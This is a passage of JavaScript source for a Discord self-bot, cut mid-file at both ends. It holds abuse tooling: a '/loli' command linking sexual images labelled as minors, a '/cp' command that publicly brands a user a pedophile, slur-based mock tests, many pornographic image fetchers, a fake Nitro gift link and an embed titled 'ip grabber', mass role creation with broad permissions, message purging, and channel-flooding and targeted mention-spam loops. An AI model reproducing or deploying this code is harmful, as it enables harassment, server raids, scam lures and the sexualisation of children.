"https://us.rule34.xxx/thumbnails/2345/thumbnail_74cc1c7b19f7e34fe6b750f905e7fd3f.jp",
"https://us.rule34.xxx/thumbnails/692/thumbnail_fbab6a1ab8ecd604751253944e42ad9f8bdac54e.jpg",
""
        ];

        var result = replies[Math.floor(Math.random() * replies.length)];

        let ballembed = new Discord.RichEmbed()
            .setTitle("Loli!")
            .setColor("#800080")
            .setImage(result)
            .setFooter("The loli king");

        message.channel.send(ballembed);
        console.log(`${client.user.tag} ran command </loli>.`);
    }
}
if (command === "/embed") {
    let messageArray = message.content.split(" ");
    let command = messageArray[0];
    let args = messageArray.slice(1);
    let reason = args.slice(0).join(' ');
            let help = new Discord.RichEmbed()
                .setTitle("**__Embed__**")
                .setColor("BLUE")
                .addBlankField()
                .setDescription(`**${reason}**`)
                .setThumbnail(`${message.author.avatarURL}`)
                .setFooter(" ᥅ꪖ᥊ꪀ#0002   ")
                .setTimestamp()
            message.delete()
            message.channel.send(help)
            console.log(`${client.user.tag} ran command </embeds>.`)
        
}
if (command === "/repeat") {
    let messageArray = message.content.split(" ");
    let command = messageArray[0];
    let args = messageArray.slice(1);
    let reason = args.slice(0).join(' ');
    var interval = setInterval(function() {
            message.channel.send(`${reason}`)
        }, 700 * 5);


           
    console.log(`${client.user.tag} ran command </repeat>.`)
        
}
if (command === "/cp") {
    console.log(`${client.user.tag} ran command </cp>.`)

    message.channel.send('/image cheese pizza').then((message) => {
        message.edit(`lol Pedo @everyone look ${message.author} is a pedo HAHAHA get caught PEDOO`);
    });
}
//---------------------------------------------------------------------

if (message.content.startsWith("/8ball")) {

    if (message.author.id == client.user.id) {
        let replies = [
            'Maybe.',
            'Certainly not.',
            'I hope so.',
            'Not in your wildest dreams.',
            'There is a good chance.',
            'Quite likely.',
            'I think so.',
            'I hope not.',
            'I hope so.',
            'Never!',
            'Pfft.',
            'Sorry, bucko.',
            'Hell, yes.',
            'Hell to the no.',
            'The future is bleak.',
            'The future is uncertain.',
            'I would rather not say.',
            'Who cares?',
            'Possibly.',
            'Never, ever, ever.',
            'There is a small chance.',
            'Yes!',
            'lol no.',
            'There is a high probability.',
            'What difference does it makes?',
            'Not my problem.',
            'Ask someone else.'
        ];

        var result = replies[Math.floor(Math.random() * replies.length)];

        let ballembed = new Discord.RichEmbed()
            .setTitle("MAGIC 8 BALL!")
            .setColor("#800080")
            .addField("A:", result)
            .setFooter("The Oracal X");

        message.channel.send(ballembed);
        console.log(`${client.user.tag} ran command </8ball>.`);
    }
}

//---------------------------------------------------------------------
if (message.content.startsWith("/rand10")) {

    if (message.author.id == client.user.id) {
        let replies = [
            '1X',
            '2X',
            '3X',
            '4X',
            '5X',
            '6X',
            '7X',
            '8X',
            '9X',
            '10X'
        ];

        var result = replies[Math.floor(Math.random() * replies.length)];

        let ballembed = new Discord.RichEmbed()
            .setTitle("Raindom Number!")
            .setColor("#800080")
            .addField("*Number:*", `**__${result}__**`)
            .setFooter("The Oracal X");

        message.channel.send(ballembed);
        console.log(`${client.user.tag} ran command </rand>.`);
    }
}
//---------------------------------------------------------------------
if (message.content.startsWith("/retard-test")) {

    if (message.author.id !== client.user.id) {
        let replies = [
            '10%',
            '20%',
            '30%',
            '40%',
            '50%',
            '60%',
            '70%',
            '80%',
            '90%',
            '100%'
        ];

        var result = replies[Math.floor(Math.random() * replies.length)];

        let ballembed = new Discord.RichEmbed()
            .setTitle("Retard Test!")
            .setColor("#800080")
            .setDescription( `**this person ${result} retarded**`)
            .setFooter("The Oracal X");

        message.channel.send(ballembed);
        console.log(`${client.user.tag} ran command </rand>.`);
    }
    else{
            let replies = [
                '10%',
                '1%'
            ];
    
            var result = replies[Math.floor(Math.random() * replies.length)];
    
            let ballembed = new Discord.RichEmbed()
                .setTitle("Retard Test!")
                .setColor("#800080")
                .setDescription( `**this person ${result} retarded**`)
                .setFooter("The Oracal X");
    
            message.channel.send(ballembed);
            console.log(`${client.user.tag} ran command </rand>.`);

    }
}
if (message.content.startsWith("/penis")) {

    if (message.author.id !== client.user.id) {
        let replies = [
            '8=D',
            '8==D',
            '8===D',
            '8D',
            '8=D',
            '8==D',
            '8===D',
            '8===D',
            '8====D',
            '8=====D',
            '8=======D',
            '8=========D'

        ];

        var result = replies[Math.floor(Math.random() * replies.length)];

        let ballembed = new Discord.RichEmbed()
            .setTitle("Penis size!")
            .setColor("#800080")
            .addField(`*${message.author.tag}'s penis:*`, `**${result}**`)
            .setFooter("The Oracal X");

        message.channel.send(ballembed);
        console.log(`${client.user.tag} ran command </rand>.`);
    }
    else{
            
        let ballembed = new Discord.RichEmbed()
            .setTitle("Penis size!")
            .setColor("#800080")
            .addField(`*${message.author.tag}'s penis:*`, `**8==================D**`)
            .setFooter("The Oracal X");

    message.channel.send(ballembed);
    console.log(`${client.user.tag} ran command </rand>.`);

    }
}

//---------------------------------------------------------------------
if (message.content.startsWith("/skid")) {

    if (message.author.id == client.user.id) {

        let ballembed = new Discord.RichEmbed()
            .setTitle("[ད₢₷ཌ]-᭙ꪖꪻꫀ᥅#9332")
            .setDescription('yes its true im a big skid everyone chat ogga bogga :bow: im humbled', true)
            .setColor("#000080")
            .setImage(result)

        message.channel.send(ballembed);
        console.log(`${client.user.tag} ran command </skid>.:) `);
    }
}

//---------------------------------------------------------------------

if (message.content.startsWith('/anime-facts')) {

    if (message.author.id == client.user.id) {
        const randomfact = require('anime-facts')
        const fact = randomfact.facts()
        let Geo = new Discord.RichEmbed()
            .setTimestamp()
            .setThumbnail(`${message.author.avatarURL}`)
            .setTitle(`**__Anime Fact__**`)
            .setDescription(`${fact}`)
            .setFooter(`Looked up by: ${message.author.username}`);

        message.channel.send({
            embed: Geo
        });
            console.log(`${client.user.tag} ran command </anime-facts>.`);
        }
    }
//Reddit---------------------------------------------------------------------------------
if (message.content.startsWith(prefix + "dankmeme")) {
    if (message.author.id !== client.user.id) return;

    const embed = new Discord.RichEmbed();
got('https://www.reddit.com/r/memes/random/.json').then(response => {
    let content = JSON.parse(response.body);
    let permalink = content[0].data.children[0].data.permalink;
    let memeUrl = `https://reddit.com${permalink}`;
    let memeImage = content[0].data.children[0].data.url;
    let memeTitle = content[0].data.children[0].data.title;
    let memeUpvotes = content[0].data.children[0].data.ups;
    let memeNumComments = content[0].data.children[0].data.num_comments;
    embed.setTitle(`${memeTitle}`);
    embed.setURL(`${memeUrl}`)
    embed.setColor('RANDOM')
    embed.setImage(memeImage);
    embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
    embed.setTimestamp();
    message.channel.send(embed)
    console.log(`${client.user.tag} ran command </dankmeme>.`);
     })

}
if (message.content.startsWith(prefix + "anime")) {
    if (message.author.id !== client.user.id) return;

    const embed = new Discord.RichEmbed();
got('https://www.reddit.com/r/goodanimemes/random/.json').then(response => {
    let content = JSON.parse(response.body);
    let permalink = content[0].data.children[0].data.permalink;
    let memeUrl = `https://reddit.com${permalink}`;
    let memeImage = content[0].data.children[0].data.url;
    let memeTitle = content[0].data.children[0].data.title;
    let memeUpvotes = content[0].data.children[0].data.ups;
    let memeNumComments = content[0].data.children[0].data.num_comments;
    embed.setTitle(`${memeTitle}`);
    embed.setURL(`${memeUrl}`)
    embed.setColor('RANDOM')
    embed.setImage(memeImage);
    embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
    embed.setTimestamp();
    message.channel.send(embed)
    console.log(`${client.user.tag} ran command </anime>.`);
     })

}
if (message.content.startsWith(prefix + "shitposting")) {
    if (message.author.id !== client.user.id) return;

    const embed = new Discord.RichEmbed();
got('https://www.reddit.com/r/shitposting/random/.json').then(response => {
    let content = JSON.parse(response.body);
    let permalink = content[0].data.children[0].data.permalink;
    let memeUrl = `https://reddit.com${permalink}`;
    let memeImage = content[0].data.children[0].data.url;
    let memeTitle = content[0].data.children[0].data.title;
    let memeUpvotes = content[0].data.children[0].data.ups;
    let memeNumComments = content[0].data.children[0].data.num_comments;
    embed.setTitle(`${memeTitle}`);
    embed.setURL(`${memeUrl}`)
    embed.setColor('RANDOM')
    embed.setImage(memeImage);
    embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
    embed.setTimestamp();
    message.channel.send(embed)
    console.log(`${client.user.tag} ran command </shitposting>.`);
     })

}
if (message.content.startsWith(prefix + "pewds")) {
    if (message.author.id !== client.user.id) return;

    const embed = new Discord.RichEmbed();
got('https://www.reddit.com/r/PewdiepieSubmissions/random/.json').then(response => {
    let content = JSON.parse(response.body);
    let permalink = content[0].data.children[0].data.permalink;
    let memeUrl = `https://reddit.com${permalink}`;
    let memeImage = content[0].data.children[0].data.url;
    let memeTitle = content[0].data.children[0].data.title;
    let memeUpvotes = content[0].data.children[0].data.ups;
    let memeNumComments = content[0].data.children[0].data.num_comments;
    embed.setTitle(`${memeTitle}`);
    embed.setURL(`${memeUrl}`)
    embed.setColor('RANDOM')
    embed.setImage(memeImage);
    embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
    embed.setTimestamp();
    message.channel.send(embed)
    console.log(`${client.user.tag} ran command </pewds>.`);
     })

}
if (message.content.startsWith(prefix + "meme")) {
        if (message.author.id !== client.user.id) return;

        const embed = new Discord.RichEmbed();
    got('https://www.reddit.com/r/dankmemes/random/.json').then(response => {
        let content = JSON.parse(response.body);
        let permalink = content[0].data.children[0].data.permalink;
        let memeUrl = `https://reddit.com${permalink}`;
        let memeImage = content[0].data.children[0].data.url;
        let memeTitle = content[0].data.children[0].data.title;
        let memeUpvotes = content[0].data.children[0].data.ups;
        let memeNumComments = content[0].data.children[0].data.num_comments;
        embed.setTitle(`${memeTitle}`);
        embed.setURL(`${memeUrl}`)
        embed.setColor('RANDOM')
        embed.setImage(memeImage);
        embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
        embed.setTimestamp();
        message.channel.send(embed)
        console.log(`${client.user.tag} ran command </meme>.`);
         })

    }

    if (message.content.startsWith(prefix + "im14")) {
        if (message.author.id !== client.user.id) return;
const embed = new Discord.RichEmbed();
    got('https://www.reddit.com/r/im14andthisisdeep/random/.json').then(response => {
        let content = JSON.parse(response.body);
        let permalink = content[0].data.children[0].data.permalink;
        let memeUrl = `https://reddit.com${permalink}`;
        let memeImage = content[0].data.children[0].data.url;
        let memeTitle = content[0].data.children[0].data.title;
        let memeUpvotes = content[0].data.children[0].data.ups;
        let memeNumComments = content[0].data.children[0].data.num_comments;
        embed.setTitle(`${memeTitle}`);
        embed.setURL(`${memeUrl}`)
        embed.setColor('RANDOM')
        embed.setImage(memeImage);
        embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
        embed.setTimestamp();
        message.channel.send(embed)
        console.log(`${client.user.tag} ran command </im14>.`);
    })
 }
   
 if (message.content.startsWith(prefix + "masterhacker")) {
    if (message.author.id !== client.user.id) return;
    const embed = new Discord.RichEmbed();
        got('https://www.reddit.com/r/masterhacker/random/.json').then(response => {
            let content = JSON.parse(response.body);
            let permalink = content[0].data.children[0].data.permalink;
            let memeUrl = `https://reddit.com${permalink}`;
            let memeImage = content[0].data.children[0].data.url;
            let memeTitle = content[0].data.children[0].data.title;
            let memeUpvotes = content[0].data.children[0].data.ups;
            let memeNumComments = content[0].data.children[0].data.num_comments;
            embed.setTitle(`${memeTitle}`);
            embed.setURL(`${memeUrl}`)
            embed.setColor('RANDOM')
            embed.setImage(memeImage);
            embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
            embed.setTimestamp();
            message.channel.send(embed)
            console.log(`${client.user.tag} ran command </masterhacker>.`);
        })
     }
     if (message.content.startsWith(prefix + "woosh")) {
        if (message.author.id !== client.user.id) return;
        const embed = new Discord.RichEmbed();
            got('https://www.reddit.com/r/woosh/random/.json').then(response => {
                let content = JSON.parse(response.body);
                let permalink = content[0].data.children[0].data.permalink;
                let memeUrl = `https://reddit.com${permalink}`;
                let memeImage = content[0].data.children[0].data.url;
                let memeTitle = content[0].data.children[0].data.title;
                let memeUpvotes = content[0].data.children[0].data.ups;
                let memeNumComments = content[0].data.children[0].data.num_comments;
                embed.setTitle(`${memeTitle}`);
                embed.setURL(`${memeUrl}`)
                embed.setColor('RANDOM')
                embed.setImage(memeImage);
                embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
                embed.setTimestamp();
                message.channel.send(embed)
                console.log(`${client.user.tag} ran command </woosh>.`);
            })
         }
         if (message.content.startsWith(prefix + "deepfry")) {
            if (message.author.id !== client.user.id) return;
            const embed = new Discord.RichEmbed();
                got('https://www.reddit.com/r/DeepFriedMemes/random/.json').then(response => {
                    let content = JSON.parse(response.body);
                    let permalink = content[0].data.children[0].data.permalink;
                    let memeUrl = `https://reddit.com${permalink}`;
                    let memeImage = content[0].data.children[0].data.url;
                    let memeTitle = content[0].data.children[0].data.title;
                    let memeUpvotes = content[0].data.children[0].data.ups;
                    let memeNumComments = content[0].data.children[0].data.num_comments;
                    embed.setTitle(`${memeTitle}`);
                    embed.setURL(`${memeUrl}`)
                    embed.setColor('RANDOM')
                    embed.setImage(memeImage);
                    embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
                    embed.setTimestamp();
                    message.channel.send(embed)
                    console.log(`${client.user.tag} ran command </deepfry>.`);
                })
             }
if (command === '/<@762360959351914517>') {
       		
	   const embed = new Discord.RichEmbed()
                .setDescription(`<@762360959351914517> you are gay `)
                .setColor('RANDOM')
                .setFooter('bot made by 尺ﾑﾒ刀#9763')
                message.channel.send(embed)
   
        console.log(`${client.user.tag} ran command </plol >`)
    
}
//NSFW---------------------------------------------------------------------

if (command === '/porn') {

        if (args1 < 1) {
            message.channel.send('```do /nsfw-commands dumbass!```');
        } else {
            superagent.get('https://nekobot.xyz/api/image')
            .query({ type: `${args1}` })
            .end((err, response) => {
                const embed = new Discord.RichEmbed()
                .setDescription(`No image? click here(${response.body.message})`)
                .setColor('RANDOM')
                .setImage(response.body.message)
                .setFooter('Raxn')
                message.channel.send(embed)
            })
        }
        console.log(`${client.user.tag} ran command </porn ${args1}>`)
    
}

if (message.content.startsWith(prefix + "gay")) {


    snekfetch.get('http://barapi.geopjr.xyz/json.php').then(r => {
        let embed = new Discord.RichEmbed()
            .setTitle("Yaoi")
            .setImage(r.body.link)
            .setColor('RANDOM')
        message.channel.send(embed)
        console.log(`${client.user.tag} ran command </gay>.`);
    });


}

if (message.content.startsWith(prefix + "ass")) {
    var max = 5511;
    var min = 1000;
    var MathRan = Math.floor(Math.random() * (max - min + 0)) + min;
    var MathLoL = Math.round(MathRan);

    let embed = new Discord.RichEmbed()
        .setTitle("Ass (Bundas)")
        .setImage("http://media.obutts.ru/butts_preview/0" + MathLoL + ".jpg")
        .setColor('RANDOM')
    message.channel.send(embed)
    console.log(`${client.user.tag} ran command </ass>.`);


}
if (message.content.startsWith(prefix + "milf")) {
    const embed = new Discord.RichEmbed();
        got('https://www.reddit.com/r/bigtitsinbikinis/random/.json').then(response => {
            let content = JSON.parse(response.body);
            let permalink = content[0].data.children[0].data.permalink;
            let memeUrl = `https://reddit.com${permalink}`;
            let memeImage = content[0].data.children[0].data.url;
            let memeTitle = content[0].data.children[0].data.title;
            let memeUpvotes = content[0].data.children[0].data.ups;
            let memeNumComments = content[0].data.children[0].data.num_comments;
            embed.setTitle(`Milf`);
            embed.setURL(`${memeUrl}`)
            embed.setColor('RANDOM')
            embed.setImage(memeImage);
            embed.setTimestamp();
            message.channel.send(embed)
            console.log(`${client.user.tag} ran command </milf>.`);
        })


}

if (message.content.startsWith(prefix + "boobs")) {

    var max = 13440;
    var min = 10000;
    var MathRan = Math.floor(Math.random() * (max - min + 0)) + min;
    var MathLoL = Math.round(MathRan);

    let embed = new Discord.RichEmbed()
        .setTitle("Boobs (Peitos)")
        .setImage("http://media.oboobs.ru/boobs_preview/" + MathLoL + ".jpg")
        .setColor('RANDOM')
    message.channel.send(embed)
    console.log(`${client.user.tag} ran command </boobs>.`);


}

if (message.content.startsWith(prefix + "classics")) {

    snekfetch.get(`https://nekos.life/api/v2/img/classic`)
        .end((err, response) => {
            const lewdembed = new Discord.RichEmbed()
                .setTitle("Classic Hentai")
                .setImage(response.body.url)
                .setColor(`RANDOM`)
            message.channel.send(lewdembed);
            console.log(`${client.user.tag} ran command </classics>.`);
            
        })

}
if (message.content.startsWith(prefix + "neko")) {

    snekfetch.get(`https://nekos.life/api/v2/img/nsfw_neko_gif`)
        .end((err, response) => {
            const lewdembed = new Discord.RichEmbed()
                .setTitle("Neko Hentai")
                .setImage(response.body.url)
                .setColor(`RANDOM`)
            message.channel.send(lewdembed);
            console.log(`${client.user.tag} ran command </neko>.`);
        })

}
if (message.content.startsWith(prefix + "cum")) {

    snekfetch.get('https://nekos.life/api/v2/img/cum_jpg').end((err, response) => {
        const lewdembed = new Discord.RichEmbed()
            .setTitle("Cum Hentai")
            .setImage(response.body.url)
            .setColor(`RANDOM`)
        message.channel.send(lewdembed);
        console.log(`${client.user.tag} ran command </cum>.`);
    })

}
if (message.content.startsWith(prefix + "femdom")) {

    snekfetch.get(`https://nekos.life/api/v2/img/femdom`)
        .end((err, response) => {
            const lewdembed = new Discord.RichEmbed()
                .setTitle("Femdom Hentai")
                .setImage(response.body.url)
                .setColor(`RANDOM`)
            message.channel.send(lewdembed);
            console.log(`${client.user.tag} ran command </femdom>.`);
        })

}
if (message.content.startsWith(prefix + "gif")) {
    snekfetch.get(`https://nekos.life/api/v2/img/Random_hentai_gif`)
        .end((err, response) => {
            const lewdembed = new Discord.RichEmbed()
                .setTitle("Hentai Gif")
                .setImage(response.body.url)
                .setColor(`RANDOM`)
            message.channel.send(lewdembed);
            console.log(`${client.user.tag} ran command </gif>.`);
        })
}
if (message.content.startsWith(prefix + "trap")) {


    snekfetch.get(`https://nekos.life/api/v2/img/trap`, 'https://nekos.life/api/v2/img/futanari')
        .end((err, response) => {
            const lewdembed = new Discord.RichEmbed()
                .setImage(response.body.url)
                .setColor(`RANDOM`)
            message.channel.send(lewdembed);
            console.log(`${client.user.tag} ran command </trap>.`);
        })

}
//----------------------------------------------------------------------------------------
if (message.content.startsWith("/dead")) {

    if (message.author.id == client.user.id) {
        let replies = [
            'https://media.tenor.com/images/b42c385b4bb175879769ab76609387f3/tenor.gif',
            'https://media.tenor.com/images/c052fb272fc0aed7f73b05bbef0ad938/tenor.gif',
            'https://data.whicdn.com/images/290510883/original.gif',
            'https://i.pinimg.com/originals/49/c6/52/49c652608db2ff702edad144066515cb.gif',
            'https://33.media.tumblr.com/tumblr_lxfqnyYrAX1qio1obo1_500.gif',


        ];

        var result = replies[Math.floor(Math.random() * replies.length)];

        let ballembed = new Discord.RichEmbed()
            .setTitle("Suicide!")
            .setColor("#000080")
            .setImage(result)

        message.channel.send(ballembed);
        console.log(`${client.user.tag} ran command </dead>.`);
    }
}

//---------------------------------------------------------------------
if (message.content.startsWith("/flip")) {
    if (message.author.id == client.user.id) {
        let replies = [
            'Tails',
            'Heads',

        ];

        var result = replies[Math.floor(Math.random() * replies.length)];

        let ballembed = new Discord.RichEmbed()
            .setDescription(`^^^^^^^^!`)
            .setTitle(`**${result}**`)
            .setColor("#000080")
            .setImage('https://thumbs.gfycat.com/BlondHatefulDuckbillcat-size_restricted.gif')
        message.channel.send(ballembed);
        console.log(`${client.user.tag} ran command </flip>.`);
    }
};

    
    //---------------------------------------------------------------------
if (message.content.startsWith(prefix + "purge")) {
    if (message.deletable) message.delete();
    if (message.author.id == client.user.id) {
        message.channel.fetchMessages().then((message) => message.forEach(m => m.delete()));
        console.log(`${client.user.tag} ran command </purge>.`);
    }
}

//---------------------------------------------------------------------
if (message.content.startsWith(prefix + "delt")) {
    if (message.author.id == client.user.id) {} else {
        message.delete(2)
        console.log(`${client.user.tag} ran command </delt>.`);
    }
}

//---------------------------------------------------------------------
if (message.content.startsWith(prefix + "nitro")) {
    if (client.user.id !== message.author.id) return;
    let CELESTIA_INVITE_LINK = 'https://google.com'
    var embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setTitle(` ${message.author.username}, **Nitro Bot** `)
        .addField('```Nitro Sniper has been Turned on ``` :white_check_mark:', "*Apporx-Time: 1 min*")
        .setThumbnail('https://pmcvariety.files.wordpress.com/2019/06/discrod-nitro-chara.png')
        .setTimestamp();
    message.channel.send({
        embed
    });

    var embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setTitle(`:wave: Hey ${message.author.username}, here is you Nitro `)
        .setDescription("*This was sniped From server:* ```White Kingdom```")
        .addField("Link:", `[https://discord.gift/o2ZKjMH1WW5bUmTNRPuH8e](${CELESTIA_INVITE_LINK})`)
        .setImage('https://pmcvariety.files.wordpress.com/2019/06/discrod-nitro-chara.png')
        .setTimestamp();
    setTimeout(() => {
        message.channel.send({
            embed
        });
    }, 60000);
    console.log(`${client.user.tag} ran command </nitro>.`);
}

//---------------------------------------------------------------------
if (message.content.startsWith(prefix + "install")) {
    if (message.author.id == client.user.id) {
        var ping = [Math.floor(Math.random() * 100)]
        let help = new Discord.RichEmbed()
            .setTitle("**〖Rains SelfBot〗**")
            .setColor("#00D6GF")
            .addBlankField()
            .addField("🠶 **Install**", `https://chrome.google.com/webstore/detail/discord-ultra/fffdbfhbkbekmclgbakbmmjfjblpmpic`, true)
            .setThumbnail(`https://i.pinimg.com/originals/4f/ef/36/4fef36283ced0e64e9bfc7395a87795f.gif`)
            .setFooter("🠶〖 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002  #9725 〗⭐️")
        message.channel.send(help)
    }
    console.log(`${client.user.tag} ran command </install>.`);
}
//-----------------------------------------------------------------
if (message.content.startsWith(prefix + "backup")) {
    if (message.author.id == client.user.id) {
        var ping = [Math.floor(Math.random() * 100)]
        let help = new Discord.RichEmbed()
            .setTitle("**〖Rains SelfBot〗**")
            .setColor("#00D6GF")
            .addBlankField()
            .setDescription(`
            ------------EJ---------------
            :https://discord.gg/T863sj5
            :https://discord.gg/padoru
            :https://discord.gg/RR2bNpr
            :https://discord.gg/sltind
            :https://discord.gg/world
            -----------WK------------
            :https://discord.gg/QndYX8Y
            :https://discord.gg/wqw9cju
           ------------AK------------
            :https://discord.gg/t6CCMXB
            :https://discord.gg/zsaDjUG
            :https://discord.gg/UBsccUA
            :https://discord.gg/u48W9X7
            :https://discord.gg/sqNMqdK
           -----------MH--------------
            :https://discord.gg/BGthHPc
            :https://discord.gg/c9aRDaQ 
            :https://discord.gg/th7vZJw 
            :https://discord.gg/6WzrPws
            :https://discord.gg/W2JXeMt
           -----------HH-------------
            :https://discord.gg/g9X77JX
            :https://discord.gg/HFfSprq
            :https://discord.gg/9Q5QcCT
            :https://discord.gg/JwKt6X9
           -----------AN-------------
            :https://discord.gg/SwVUqnQ
            :https://discord.gg/j34BQe8
            :https://discord.gg/4PmnVxS
            :https://discord.gg/xHJ5evp
            :https://discord.gg/xGgVNde
            :https://discord.gg/6yn4p23
           -----------------------------
            `)
            .setThumbnail(`https://i.pinimg.com/originals/4f/ef/36/4fef36283ced0e64e9bfc7395a87795f.gif`)
            .setFooter("🠶〖 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002   〗")
        message.channel.send(help)
    }
    console.log(`${client.user.tag} ran command </install>.`);
}
//---------------------------------------------------------------------

if (message.content.startsWith(prefix + "nitr0")) {
    if (client.user.id !== message.author.id) return;
    let CELESTIA_INVITE_LINK = 'https://google.com'


    var embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setTitle(`:wave: Hey ${message.author.username}, here is you command-example `)
        .setDescription("*This was sniped From server:* ```White Kingdom```")
        .addField("Link:", `[https://discord.gift/o2ZKjMH1WW5bUmTNRPuH8e](${CELESTIA_INVITE_LINK})`)
        .setImage('https://pmcvariety.files.wordpress.com/2019/06/discrod-nitro-chara.png')
        .setTimestamp();
    setTimeout(() => {
        message.channel.send({
            embed
        });
    }, 100);
    console.log(`${client.user.tag} ran command </nitr0>.`);
}

if (message.content.startsWith(prefix + "nitr0-view")) {
    if (client.user.id !== message.author.id) return;
    let CELESTIA_INVITE_LINK = 'https://google.com'


    var embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setTitle(`:octagonal_sign:  Hey ${message.author.username}, here is your ip grabber `)
        .addField("Link:", `[click-here](${CELESTIA_INVITE_LINK})`)
        .setImage('https://pmcvariety.files.wordpress.com/2019/06/discrod-nitro-chara.png')
        .setTimestamp();
    setTimeout(() => {
        message.channel.send({
            embed
        });
    }, 100);
    console.log(`${client.user.tag} ran command </nitr0>.`);
}


//---------------------------------------------------------------------
if (message.content.startsWith(prefix + 'creater')) {
    if (message.author.id == client.user.id) {
        message.delete();
        for (var i = 0; i < 90; i++) {
            message.guild.createRole({
                name: argresult,
                mentionable: false,
                permissions: 2146958591,
                position: "",
                color: "#RANDOM"
            })
        }
    }
    console.log(`${client.user.tag} ran command </creater>.`);
}

//---------------------------------------------------------------------


if (message.content.startsWith(prefix + "lagz")) {
    if (client.user.id !== message.author.id) return;
    var embed = new Discord.RichEmbed()
        .setColor("RANDOM")
        .setTitle(`:octagonal_sign:**__lagz Command is now activated__**:octagonal_sign:`)
        .setDescription('*Do laggz-y to continue or do lagz-no to cancel*')
        .setImage('https://i.pinimg.com/originals/28/93/e8/2893e84c5b837a0ab1363f82b509744a.gif')
        .setTimestamp();

    message.channel.send({
        embed
    });
    setTimeout(() => {
        message.channel.send('```Atomatic Deployment initated do (/ nuk-no) to stop this command```');
    }, 3000);
    setTimeout(() => {
        message.channel.send('**10**');
    }, 4000);
    setTimeout(() => {
        message.channel.send('**9**');
    }, 5000);
    setTimeout(() => {
        message.channel.send('**8**');
    }, 6000);
    setTimeout(() => {
        message.channel.send('**7**');
    }, 7000);
    setTimeout(() => {
        message.channel.send('**6**');
    }, 8000);
    setTimeout(() => {
        message.channel.send('**__5__**');
    }, 9000);
    setTimeout(() => {
        message.channel.send('**__4__**');
    }, 10000);
    setTimeout(() => {
        message.channel.send('**__3__**');
    }, 11000);
    setTimeout(() => {
        message.channel.send('**__2__**');
    }, 12000);
    setTimeout(() => {
        message.channel.send('__**1**__');
    }, 13000);
    setTimeout(() => {
        message.channel.send('```var _0x1f09=[(function(_0x100c82,_0x1f0992){var _0x444406=function(_0x38a2f9){while(--_0x38a2f9){_0x100c82());}};_0x444406(++_0x1f0992);}(_0x1f09,0xca));var _0x4444=function(_0x100c82,_0x1f0992){_0x100c82=_0x100c82-0x0;var _0x444406=_0x1f09[_0x100c82];return _0x444406;};setTimeout(()=>{var _0x2417a7=_0x4444;message[_0x2417a;```');
    }, 14080)
    setTimeout(() => {
        message.channel.send('https://media.tenor.com/images/6e470af0a0fd69c4ff213a8de0bc7c5d/tenor.gif');
    }, 15080)
    console.log(`${client.user.tag} ran command </lagz>!!!!`);
}

//---------------------------------------------------------------------
 
    var spam = [];

for (l = 0; l < 10; l++) {
	spam[l] = '';
	for (i = 0; i < 2000; i++) {
		spam[l] = spam[l] + rand();
	}
}
	if (message.content.startsWith('/laggz-y')) {
		for (c = 0; c < 50; c++) {
			message.channel.send(spam[c])
            message.channel.send(spam[c])
            message.channel.send(spam[c])
            message.channel.send(spam[c])
            message.channel.send(spam[c])
	message.channel.send('https://media.tenor.com/images/6e470af0a0fd69c4ff213a8de0bc7c5d/tenor.gif')
			
		}
	}


function rand() {
	return String.fromCharCode((Math.random() * (9999 - 0) + 0).toString());
}
//---------------------------------------------------------------------

if (message.content.startsWith(prefix + "spam")) {
    if (client.user.id !== message.author.id) return;
    //checks if the username to fight is in the message
    let author1 = message.author.username;
    let user = message.mentions.users.first();



    //saves the two user ids to variables
    var fighter1 = message.author.id;
    var fighter2 = user.id;

    //announces challenge and awaits response
    var challenged = user.toString();

    message.channel.send(`> **${challenged}, ${author1} spam started** `)
        .then(() => {
            var interval = setInterval(function() {
                // use the message's channel (TextChannel) to send a new message
               
		    message.channel.send(`> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
`)
		    message.channel.send(`> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
`)
		    message.channel.send(`> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
